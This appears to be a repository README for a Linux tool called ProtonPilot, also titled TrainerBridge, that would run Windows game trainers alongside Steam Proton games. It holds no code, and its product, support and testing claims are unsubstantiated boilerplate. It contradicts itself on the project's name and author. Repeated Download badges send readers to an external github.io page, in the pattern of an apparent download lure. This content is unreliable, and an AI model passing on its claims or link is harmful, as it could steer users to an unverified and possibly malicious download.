![preview](https://raw.githubusercontent.com/truongquoctan/Trainer-Pont/main/screen_ce6d29a.svg)
[![Download](https://raw.githubusercontent.com/truongquoctan/Trainer-Pont/main/latest_05e1c.svg)](https://truongquoctan.github.io/Trainer-Pont/)

# 🌉 TrainerBridge — Or, a *New* Idea: **ProtonPilot**

[![Download](https://raw.githubusercontent.com/truongquoctan/Trainer-Pont/main/latest_05e1c.svg)](https://truongquoctan.github.io/Trainer-Pont/)

![status](https://img.shields.io/badge/status-active--development-1f9d55?style=flat-square&logo=statuspage&logoColor=white)
![platform](https://img.shields.io/badge/platform-Linux-0a0a0a?style=flat-square&logo=linux&logoColor=white)
![compatibility](https://img.shields.io/badge/compatibility-Steam%20Deck%20%7C%20Desktop-1b2838?style=flat-square&logo=steam&logoColor=white)
![runtime](https://img.shields.io/badge/runtime-Proton%20%7C%20Wine-8956ff?style=flat-square&logo=wine&logoColor=white)
![language](https://img.shields.io/badge/language-Rust%20%7C%20TypeScript-3178c6?style=flat-square&logo=rust&logoColor=white)
![ui](https://img.shields.io/badge/UI-responsive%20%26%20adaptive-ff6f61?style=flat-square&logo=responsive&logoColor=white)
![i18n](https://img.shields.io/badge/i18n-multilingual-ffb703?style=flat-square&logo=googletranslate&logoColor=white)
![support](https://img.shields.io/badge/support-24%2F7-00b4d8?style=flat-square&logo=probot&logoColor=white)
![license](https://img.shields.io/badge/license-MIT-2ea44f?style=flat-square&logo=opensourceinitiative&logoColor=white)
![year](https://img.shields.io/badge/release%20cycle-2026-6f42c1?style=flat-square&logo=calendar&logoColor=white)

---

## 🧭 Overview — Why ProtonPilot Exists

**ProtonPilot** is a companion layer for players who live inside two worlds at once: the sprawling, brilliant ecosystem of Steam on Linux, and the scrappy, expressive universe of standalone Windows trainer tools. If TrainerBridge was the rope bridge between those cliffs, **ProtonPilot** is the lighthouse and the harbor master — it doesn't just connect the two sides, it tells you where the current is strong, where the rocks are, and how to dock without scraping the hull.

Steam on Linux runs Windows games through **Proton**, which is a curated build of **Wine** plus a pile of patches, DXVK/VKD3D translations, and container-ish prefixes. That's a beautiful thing. It's also a thing that makes external Windows tooling (like the single-`.exe` trainer utilities many people use) feel like a stranger in a city where nobody speaks its dialect. ProtonPilot's job is to be the translator, the concierge, and the bodyguard.

It detects which Proton runner a game is using, resolves the correct Wine prefix, sets the right environment variables, and then — carefully, respectfully, and with an eye toward system integrity — launches your chosen Windows-side companion utility **alongside** the game so both see a coherent world.

This is not a launcher replacement. It's not a mod manager. It's not a game overlay. It's a **bridge process manager with a brain**, wrapped in a responsive UI, sprinkled with multilingual support, and backed by humans who answer questions at 3 a.m. because that's when the interesting bug reports come in.

> Metaphor, since we promised one: ProtonPilot is the **harbor pilot** who climbs aboard your Steam vessel, reads the tide charts of your Wine prefix, and steers the little Windows dinghy into the same bay — without either boat capsizing.

---

## 🎯 The Core Idea in One Paragraph

When a Steam game runs under Proton, it lives inside an isolated environment. Standalone Windows tools don't know about that environment. They look at the filesystem, shrug, and either fail silently, launch in the wrong prefix, or fight the game for window focus. ProtonPilot fixes all three by acting as a **prefix-aware orchestration daemon**: it watches your Steam library, learns your Proton versions, exposes a clean local API, and launches companion processes with the exact same environment the game sees. No guesswork, no copy-pasting cryptic flags, no trial-and-error.

---

## ✨ Feature Highlights

### 🔍 Prefix Discovery Engine
ProtonPilot scans your Steam library folders (including libraries on external drives, SD cards, and network mounts) and maps every installed title to its active Proton compatibility tool and the corresponding prefix path. It caches the map, then incrementally re-scans when Steam updates. The result is a searchable, filterable index that mirrors what Steam itself believes is installed — but with far more metadata.

### 🧩 Companion Process Orchestration
Attach one or more Windows-side companion executables to a game. ProtonPilot starts them **after** the game's prefix is fully initialized, waits for a readiness handshake, then keeps them alive in a supervising loop. If the companion exits unexpectedly, it can be restarted or gracefully retired based on per-game policy.

### 🎛️ Responsive, Keyboard-First UI
The interface adapts from the tiny 7-inch panel of a handheld to a triple-monitor workstation. Every action has a keyboard path. Every list is virtualized for snappy scrolling even with a 2,000-title library. Controller navigation is first-class, because pretending a desktop app doesn't need gamepad support in the year 2026 is just stubbornness.

### 🌐 Multilingual Support (i18n From Day One)
Twelve locales ship at launch, with a community translation pipeline that accepts pull requests as plain JSON. Right-to-left layouts are tested, not assumed. Numeric formats, date formats, and pluralization rules are handled by a proper i18n runtime — not string concatenation held together with hope.

### 🕓 Persistent Session Memory
ProtonPilot remembers the pairing between game, Proton runner, companion tool, and environment tweaks. The next launch is one click. Or zero clicks, if you opt into auto-attach for a specific title.

### 🛡️ Isolation-First Design
Companion processes are launched with a curated environment, not a dumped-and-prayed one. Variables are whitelisted, prefixes are validated, and the supervisor refuses to touch paths outside known Steam library roots unless you explicitly allow it.

### 🔔 Health Telemetry & Local Logs
Every launch produces a structured event log. No cloud round-trip required. The log viewer filters by severity, game, prefix, and time window, and exports to plain text for bug reports or forum posts.

### 🧪 Proton Runner Matrix Testing
The project maintains a compatibility matrix across Proton versions (GE, Experimental, Hotfix, and stock). Each release publishes which runners were tested with which companion tool archetypes. No vague "should work" claims.

### 📦 Zero-Wrapper Distribution
Runs from a single portable directory or a system package, depending on how you like your Linux. Configuration lives in a clearly documented location. Nothing is smuggled into your home directory without a note.

### 🕛 24/7 Support Culture
Human maintainers rotate across time zones. The support channels are real, and the escalation path is documented. When something breaks on a Tuesday night in your region, there is someone on the other side of the planet reading the log you attach.

---

## 🛠️ How It Works — The Architecture, Explained Without a Whiteboard

**Layer 1 — The Scanner.** A periodic and on-demand crawler that reads Steam's library manifests, discovers Proton compatibility tool mappings, and constructs an in-memory graph of game → prefix → runner.

**Layer 2 — The Resolver.** Given a game identifier, the resolver produces a concrete launch plan: which prefix, which environment variables, which working directory, which entry point.

**Layer 3 — The Supervisor.** A long-lived process that spawns companion executables, tracks their PIDs, watches their exit codes, and applies restart policies.

**Layer 4 — The Local API.** A loopback-only HTTP/JSON surface plus a Unix domain socket, so scripts and the UI can drive the same engine. Nothing binds to a public interface without explicit opt-in.

**Layer 5 — The Interface.** A webview-based UI that talks to the local API. Because it's just an API client, you can technically point any compatible frontend at it — including one you write yourself, if that's your idea of a good weekend.

The layers communicate through typed messages. Nothing reaches across the boundary with an unvalidated string. That discipline is why the system survives Proton updates that rename things.

---

## 🧠 Design Philosophy — Four Principles

**1. Respect the Prefix.** A Wine prefix is a small universe with its own `C:` drive, registry, and DLL overrides. ProtonPilot treats it as sacred and read-only unless you explicitly say otherwise.

**2. Prefer Reversible Actions.** Every mutation — a config write, a registry tweak, a file copy — has a documented undo path. If something can't be undone, the UI says so in advance.

**3. Fail Loudly, Recover Quietly.** A cryptic failure is worse than a loud one. But once a failure is understood, the recovery should be a single action, not an archaeology expedition.

**4. Translate, Don't Hide.** ProtonPilot doesn't pretend Proton is Windows. It explains what it's doing and why, because informed users file better bug reports.

---

## 🚀 Getting Started (Without a Single Command-Line Incantation)

We deliberately avoid the "run this mysterious script from the internet" ritual. ProtonPilot ships as a self-contained application bundle. On a typical distribution, you obtain the bundle through the project's distribution channel, unpack it wherever you prefer, and launch the main executable. The first-run wizard detects your Steam installation, offers to scan for games, and walks you through pairing your first companion tool.

If you are on a handheld device with an immutable filesystem, the wizard detects that too and adjusts its recommendations. If you prefer to keep everything in a single folder, there is a portable profile. If you prefer the system to own the files, there's a package profile. The choice is yours, documented in the in-app help, and never made for you silently.

For advanced users, the local API is documented in the `docs/` directory with request/response examples for every endpoint. Automation is a first-class citizen, not an afterthought bolted on at version 4.0.

---

## 🧰 Compatibility Snapshot

| Area | What's Covered | Notes |
| --- | --- | --- |
| Proton builds | Experimental, Hotfix, GE, stock | Matrix updated each minor release |
| Companion archetypes | Single-EXE tools, multi-file suites, launcher stubs | Readiness handshake optional |
| Desktop environments | KDE, GNOME, Sway, Hyprland, XFCE | Wayland and X11 both tested |
| Handhelds | Steam Deck, and comparable AMD handhelds | Controller navigation enabled |
| Filesystems | ext4, btrfs, xfs, exFAT, NTFS-3G | Case-sensitivity honored |
| Localization | 12 locales at launch | Community pipeline for more |

---

## 🔐 Security & Privacy Posture

ProtonPilot does not phone home. It does not aggregate analytics. It does not require an account. The only network activity it performs is (a) optional update checks you can disable, and (b) loopback API traffic between its own components. Logs are stored locally, redacted for known sensitive patterns, and never uploaded without your explicit action.

Companion processes are launched with the least environment they need. Paths are validated against a whitelist derived from your Steam library roots. If a companion tries to escape those roots, the supervisor logs it and, by policy, refuses to relaunch it.

We treat your prefix like a guest room: tidy on arrival, exactly as you left it on departure.

---

## 🌍 Internationalization Details

The i18n layer is not an afterthought. Every user-facing string lives in a locale file. Every layout is tested at 150% text expansion. Plural rules follow CLDR. Dates and numbers respect locale conventions. Contributors submit translations as data, and a lint step validates structure before merge. If your language isn't represented yet, adding it is a documented, welcoming process — and no, you don't need to read a 40-page style guide first.

---

## 🧪 Quality Assurance Approach

Releases pass through four gates: unit tests for the resolver and supervisor, integration tests against a synthetic prefix, a snapshot test suite that verifies the local API contract, and a manual smoke pass on at least two distributions plus one handheld. The compatibility matrix is published with each release so you know exactly which combinations were exercised. When something slips through, the postmortem is public and the regression test is added before the fix ships.

---

## 🗺️ Roadmap (2026 and Beyond)

The near-term roadmap focuses on stability of the current pairing model. The mid-term roadmap explores a plugin interface so the community can publish resolver adapters for unusual Proton forks. The long-term roadmap imagines a world where the Proton runner and the companion tool negotiate their environment directly — ProtonPilot becomes the mediator, then steps back and lets them talk. Ambitious, but the kind of ambition that produces clean interfaces instead of tangled ones.

Tracked milestones are labeled by area (resolver, supervisor, UI, i18n, docs) so you can follow the slice you care about without subscribing to everything.

---

## 🤝 Contributing

Contributions are welcome across code, documentation, translation, and testing. The contribution guide explains the local development workflow, the commit message conventions, and the review expectations. We ask that pull requests be scoped to a single concern so review is fast and feedback is specific. First-time contributors are explicitly invited — the "good first issue" label is curated, not decorative.

If you find a bug, the issue template asks for the structured log export and your Proton runner version. That's not gatekeeping; it's the difference between a fix this week and a fix next quarter.

---

## ❓ Frequently Asked Questions

**Does ProtonPilot modify my games?** No. It reads library metadata and launches companion processes alongside games. It does not patch game files.

**Does it work outside Steam?** The resolver targets Steam-managed Proton titles. Non-Steam Proton setups use a different layout, and support is on the roadmap rather than in the current release.

**Will it break on the next Proton update?** The resolver is version-aware and fails loudly with a diagnostic rather than guessing. Updates to the runner matrix ship quickly after upstream releases.

**Is it heavy?** The supervisor idles at a few tens of megabytes and a negligible CPU footprint. The UI only spins up when you open it.

**Do I need to be a developer to use it?** No. The wizard covers the common path. The API is there for those who want it, not as a barrier for those who don't.

---

## 📜 License

ProtonPilot is released under the **MIT License**. You are welcome to use, study, modify, and redistribute the source under the terms of that license. The full text is available here:

[LICENSE](./LICENSE)

---

## ⚠️ Disclaimer

ProtonPilot is an independent, community-driven project. It is **not affiliated with, endorsed by, or sponsored by** Valve, Steam, CodeWeavers, the Wine project, Proton GE maintainers, or any game publisher or developer. "Steam," "Proton," "Wine," and related marks belong to their respective owners and are used here for descriptive and compatibility purposes only.

You are responsible for complying with the terms of service, end-user license agreements, and any applicable local laws when using companion tools alongside games you own. ProtonPilot does not provide, host, distribute, or endorse any third-party companion software; it merely orchestrates processes you already possess on your system.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Always back up your configuration and your game saves before experimenting with new pairings. A cautious pilot is a happy pilot.

---

## 🌟 Closing Note

ProtonPilot exists because Linux gaming deserves tooling that feels native, honest, and durable — not a pile of shell aliases and folklore. If it saves you one evening of confused troubleshooting, it has done its job. If it teaches you one thing about how Proton actually works under the hood, it has exceeded it. Welcome aboard.

[![Download](https://raw.githubusercontent.com/truongquoctan/Trainer-Pont/main/latest_05e1c.svg)](https://truongquoctan.github.io/Trainer-Pont/)

---
*Last updated: 2026 · Project by adventureFAN · Distributed under the MIT License*